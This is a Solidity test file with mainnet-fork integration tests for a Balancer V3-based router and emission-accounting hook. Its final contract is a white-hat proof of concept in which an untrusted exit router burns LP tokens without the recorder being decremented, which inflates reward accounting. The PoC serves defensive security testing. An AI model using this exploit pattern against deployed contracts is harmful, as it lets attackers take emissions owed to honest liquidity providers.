// SPDX-License-Identifier: GPL-3.0-or-later
pragma solidity ^0.8.26;

import { IERC20 } from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import { IVault } from "@balancer-labs/v3-interfaces/contracts/vault/IVault.sol";
import { RemoveLiquidityParams, RemoveLiquidityKind } from "@balancer-labs/v3-interfaces/contracts/vault/VaultTypes.sol";
import { Router } from "@balancer-labs/v3-vault/contracts/Router.sol";
import { IPermit2 } from "permit2/src/interfaces/IPermit2.sol";

import { StagePIntegrationFixture } from "./StagePIntegration.t.sol";
import { DeployRouter } from "../../script/DeployRouter.s.sol";
import { EmissionDistributor } from "../../src/emission/EmissionDistributor.sol";

/// @title  RouterIntegrationTest
/// @notice PB3.3d (PB-D22 (v)) — the mainnet-fork witness realizing the production-router leg
///         P-D26 (3) deferred to P-bis: the canonical Router deployed via script/DeployRouter.s.sol
///         against the fork-deployed Aureum Vault + canonical permit2 + mainnet WETH; the governor
///         aims the hook's one-shot governanceModule at itself and seats the Router on the F-09
///         allowlist (WH-P6 S10 (b) ordering — the orchestrator's recorder binds precede the seat).
///         d1 covers: the script-driven deploy + version pin, the fail-closed pre-seat negative
///         (a real Router add records nothing while unseated), and the aim + seat. d2 adds the
///         post-seat true-LP credit and the remove leg (the F-17 symmetric-accounting dependency).
/// @dev    Run file-scoped per D35/D36: forge test with match-path on this file, fork-url mainnet,
///         threads 1. The fixture setUp (full-stack deploy) runs once per test.
contract RouterIntegrationTest is StagePIntegrationFixture {
    address internal constant MAINNET_WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address internal constant CANONICAL_PERMIT2 = 0x000000000022D473030F116dDEE9F6B43aC78BA3;

    address internal router;
    EmissionDistributor internal distributor;
    address internal gov;

    function setUp() public override {
        super.setUp();
        // PB10: cache the orchestrator getters into locals; never chain them under a prank.
        distributor = orchestrator.emissionDistributor();
        // The fixture's GOVERNANCE_MULTISIG env identity (P-D31 unified governor) — the hook's
        // _governanceAdmin and, per PB-D22 (iii), the module-aim target.
        gov = address(orchestrator);
        vm.setEnv("AUREUM_VAULT", vm.toString(address(vault)));
        vm.setEnv("WETH_ADDRESS", vm.toString(MAINNET_WETH));
        vm.setEnv("PERMIT2_ADDRESS", vm.toString(CANONICAL_PERMIT2));
        router = new DeployRouter().run();
    }

    /// @dev Fund `lp` with the given tokens and run the permit2 two-step toward the Router:
    ///      ERC20 approve to canonical permit2, then permit2.approve(token, router, amt, expiry).
    function _fundAndPermit(address lp, IERC20[] memory tokens, uint256[] memory amts) internal {
        vm.startPrank(lp);
        for (uint256 i = 0; i < tokens.length; ++i) {
            deal(address(tokens[i]), lp, amts[i]);
            tokens[i].approve(CANONICAL_PERMIT2, type(uint256).max);
            IPermit2(CANONICAL_PERMIT2).approve(
                address(tokens[i]), router, uint160(amts[i]), uint48(block.timestamp + 1 days)
            );
        }
        vm.stopPrank();
    }

    /// @notice The script-driven deploy landed and version() reads the PB-D22 (iv) Aureum-branded string.
    function test_RouterDeployed_AureumVersion() public view {
        assertTrue(router != address(0));
        assertGt(router.code.length, 0);
        assertEq(Router(payable(router)).version(), "Aureum V3 Router v1 (Balancer V3 Router, pinned 68057fda)");
    }

    /// @notice Fail-closed negative (F-09): a REAL Router liquidity add while the Router is not yet
    ///         seated succeeds vault-side (BPT mints to the LP) but records NOTHING — the hook's
    ///         onAfterAddLiquidity skips the recorder dispatch for a non-allowlisted router.
    function test_PreSeat_RouterAddRecordsNothing() public {
        address lp = makeAddr("preSeatLp");
        IERC20[] memory tokens = vault.getPoolTokens(pilotPools[0]);
        uint256[] memory amts = new uint256[](tokens.length);
        for (uint256 i = 0; i < amts.length; ++i) {
            amts[i] = 100e18;
        }
        _fundAndPermit(lp, tokens, amts);

        vm.prank(lp);
        uint256 bptOut = Router(payable(router)).addLiquidityUnbalanced(pilotPools[0], amts, 1, false, "");

        assertGt(bptOut, 0);
        assertEq(IERC20(pilotPools[0]).balanceOf(lp), bptOut);
        assertEq(distributor.userLP(pilotPools[0], lp), 0);
    }

    /// @notice The PB-D22 (iii) sequence: at-rest premise (module unset, router untrusted), then the
    ///         governor one-shot aims governanceModule at itself and seats the Router.
    function test_ModuleAimAndSeat() public {
        assertEq(hook.governanceModule(), address(0));
        assertFalse(hook.trustedRouter(router));

        vm.prank(gov);
        hook.setGovernanceModule(gov);
        assertEq(hook.governanceModule(), gov);

        vm.prank(gov);
        hook.setTrustedRouter(router, true);
        assertTrue(hook.trustedRouter(router));
    }

    /* ---------- PB3.3d2 (PB-D22 (v)) — post-seat true-LP credit + the F-17 remove leg ---------- */

    /// @dev Seat the Router on the F-09 allowlist: the governor's one-shot module-aim at itself, then
    ///      the persistent setTrustedRouter — the PB-D22 (iii) sequence, factored for the d2 witnesses.
    function _seatRouter() internal {
        vm.prank(gov);
        hook.setGovernanceModule(gov);
        vm.prank(gov);
        hook.setTrustedRouter(router, true);
    }

    /// @dev `lp` adds 100e18 of each pilot-0 token through the Router via the permit2 two-step; returns
    ///      the BPT minted. Mirrors the inline add in test_PreSeat_RouterAddRecordsNothing.
    function _routerAdd(address lp) internal returns (uint256 bptOut) {
        IERC20[] memory tokens = vault.getPoolTokens(pilotPools[0]);
        uint256[] memory amts = new uint256[](tokens.length);
        for (uint256 i = 0; i < amts.length; ++i) {
            amts[i] = 100e18;
        }
        _fundAndPermit(lp, tokens, amts);
        vm.prank(lp);
        bptOut = Router(payable(router)).addLiquidityUnbalanced(pilotPools[0], amts, 1, false, "");
    }

    /// @notice Post-seat true-LP credit (F-09): once the governor seats the Router, a REAL Router add
    ///         drives the recorder — the hook resolves the LP via getSender() and recordDeposit credits
    ///         userLP to the true LP, exactly the BPT minted. The positive to the pre-seat negative.
    function test_PostSeat_RouterAddCreditsTrueLp() public {
        _seatRouter();
        address lp = makeAddr("postSeatLp");
        uint256 bptOut = _routerAdd(lp);

        assertGt(bptOut, 0);
        assertEq(IERC20(pilotPools[0]).balanceOf(lp), bptOut);
        assertEq(distributor.userLP(pilotPools[0], lp), bptOut);
    }

    /// @notice The remove leg (F-17 symmetric accounting): from a seated-router credited position, a REAL
    ///         Router removeLiquidityProportional burns BPT and drives recordWithdrawal — userLP decrements
    ///         by exactly the burned amount and stays equal to live BPT, the withdrawal symmetry F-09 must
    ///         preserve or the F-17 phantom-position desync reopens.
    function test_PostSeat_RouterRemoveDecrementsRecorder() public {
        _seatRouter();
        address lp = makeAddr("postSeatRemoveLp");
        uint256 bptOut = _routerAdd(lp);
        assertEq(distributor.userLP(pilotPools[0], lp), bptOut);

        uint256 exactBptIn = bptOut / 2;
        IERC20[] memory tokens = vault.getPoolTokens(pilotPools[0]);
        uint256[] memory minOut = new uint256[](tokens.length);

        // BAL V3 Vault.removeLiquidity spends the LP's BPT allowance granted to the Router (Vault.sol L1009).
        vm.prank(lp);
        IERC20(pilotPools[0]).approve(router, exactBptIn);
        vm.prank(lp);
        Router(payable(router)).removeLiquidityProportional(pilotPools[0], exactBptIn, minOut, false, "");

        // Symmetric: userLP decrements by exactly the burned BPT and still tracks live BPT in lockstep.
        assertEq(IERC20(pilotPools[0]).balanceOf(lp), bptOut - exactBptIn);
        assertEq(distributor.userLP(pilotPools[0], lp), bptOut - exactBptIn);
    }
}

/// @dev Untrusted proportional exit router — self-unlock remove with no getSender and no F-09 seat,
///      so the hook skips recordWithdrawal on exit.
contract UntrustedExitRouter {
    IVault internal immutable vault;

    constructor(IVault vault_) {
        vault = vault_;
    }

    /// @notice Burns `bptAmount` BPT held by this contract via proportional remove-liquidity.
    function exitPool(address pool, uint256 bptAmount) external {
        bytes memory result = vault.unlock(abi.encodeCall(this.exitCallback, (pool, bptAmount)));
        abi.decode(result, (uint256[]));
    }

    function exitCallback(address pool, uint256 bptAmount)
        external
        returns (uint256[] memory amountsOut)
    {
        require(msg.sender == address(vault), "onlyVault");
        IERC20[] memory tokens = vault.getPoolTokens(pool);
        uint256[] memory minAmountsOut = new uint256[](tokens.length);
        (, amountsOut, ) = vault.removeLiquidity(
            RemoveLiquidityParams({
                pool: pool,
                from: address(this),
                maxBptAmountIn: bptAmount,
                minAmountsOut: minAmountsOut,
                kind: RemoveLiquidityKind.PROPORTIONAL,
                userData: ""
            })
        );
        for (uint256 i = 0; i < tokens.length; ++i) {
            if (amountsOut[i] > 0) {
                vault.sendTo(tokens[i], address(this), amountsOut[i]);
            }
        }
    }
}

/// @title P1 B.3 — flash-inflation face (fork, Router chain)
/// @notice Reproduction PoC for seam-1 root cause B.3's flash-inflation face. Negative to
///         `test_PostSeat_RouterRemoveDecrementsRecorder`: an honest Router removal decrements the
///         recorder and an untrusted self-unlock exit does not. The add size is arbitrary; the defect
///         scales with whatever capital an attacker can flash. The seed-omission face lives in
///         test/whitehat/P1_B3.t.sol and, unlike this one, no caller can heal it.
contract RouterFlashDenominatorTest is StagePIntegrationFixture {
    address internal constant MAINNET_WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address internal constant CANONICAL_PERMIT2 = 0x000000000022D473030F116dDEE9F6B43aC78BA3;

    address internal router;
    EmissionDistributor internal distributor;
    address internal gov;

    function setUp() public override {
        super.setUp();
        distributor = orchestrator.emissionDistributor();
        gov = address(orchestrator);
        vm.setEnv("AUREUM_VAULT", vm.toString(address(vault)));
        vm.setEnv("WETH_ADDRESS", vm.toString(MAINNET_WETH));
        vm.setEnv("PERMIT2_ADDRESS", vm.toString(CANONICAL_PERMIT2));
        router = new DeployRouter().run();
    }

    function _fundAndPermit(address lp, IERC20[] memory tokens, uint256[] memory amts) internal {
        vm.startPrank(lp);
        for (uint256 i = 0; i < tokens.length; ++i) {
            deal(address(tokens[i]), lp, amts[i]);
            tokens[i].approve(CANONICAL_PERMIT2, type(uint256).max);
            IPermit2(CANONICAL_PERMIT2).approve(
                address(tokens[i]), router, uint160(amts[i]), uint48(block.timestamp + 1 days)
            );
        }
        vm.stopPrank();
    }

    function _seatRouter() internal {
        vm.prank(gov);
        hook.setGovernanceModule(gov);
        vm.prank(gov);
        hook.setTrustedRouter(router, true);
    }

    function _routerAdd(address lp) internal returns (uint256 bptOut) {
        IERC20[] memory tokens = vault.getPoolTokens(pilotPools[0]);
        uint256[] memory amts = new uint256[](tokens.length);
        for (uint256 i = 0; i < amts.length; ++i) {
            amts[i] = 100e18;
        }
        _fundAndPermit(lp, tokens, amts);
        vm.prank(lp);
        bptOut = Router(payable(router)).addLiquidityUnbalanced(pilotPools[0], amts, 1, false, "");
    }

    function test_P1_B3_untrustedExitBurnsBptWithoutDeflatingTheRecorderTally() public {
        _seatRouter();
        address pool = pilotPools[0];
        address attacker = makeAddr("flashAttacker");

        uint256 bptOut = _routerAdd(attacker);
        uint256 poolTotalAfterAdd = distributor.poolTotalLP(pool);
        assertGt(bptOut, 0, "seated Router add minted BPT");
        assertEq(distributor.userLP(pool, attacker), bptOut, "recorder credited the full add");

        uint256 supplyBeforeExit = IERC20(pool).totalSupply();
        UntrustedExitRouter exitRouter = new UntrustedExitRouter(vault);
        vm.prank(attacker);
        IERC20(pool).transfer(address(exitRouter), bptOut);
        exitRouter.exitPool(pool, bptOut);
        uint256 supplyAfterExit = IERC20(pool).totalSupply();

        assertEq(
            supplyBeforeExit - supplyAfterExit,
            bptOut,
            "untrusted exit burned the transferred BPT from total supply"
        );
        assertEq(IERC20(pool).balanceOf(attacker), 0, "attacker holds no live BPT after exit");
        assertEq(
            distributor.poolTotalLP(pool),
            poolTotalAfterAdd,
            "recorder poolTotalLP unchanged after untrusted exit"
        );
        assertEq(
            distributor.userLP(pool, attacker),
            bptOut,
            "recorder userLP still reports the full inflated add"
        );
    }

    function test_P1_B3_permissionlessSyncPositionHealsTheFlashInflation() public {
        _seatRouter();
        address pool = pilotPools[0];
        address attacker = makeAddr("flashAttacker");
        address stranger = makeAddr("stranger");

        uint256 bptOut = _routerAdd(attacker);
        uint256 poolTotalAfterAdd = distributor.poolTotalLP(pool);

        UntrustedExitRouter exitRouter = new UntrustedExitRouter(vault);
        vm.prank(attacker);
        IERC20(pool).transfer(address(exitRouter), bptOut);
        exitRouter.exitPool(pool, bptOut);

        uint256 stranded = bptOut;
        vm.prank(stranger);
        distributor.syncPosition(pool, attacker);

        assertEq(
            distributor.poolTotalLP(pool),
            poolTotalAfterAdd - stranded,
            "syncPosition heals flash inflation rather than leaving permanent corruption"
        );
        assertEq(
            distributor.userLP(pool, attacker),
            0,
            "attacker recorded stake cleared after sync heals the flash window"
        );
    }
}
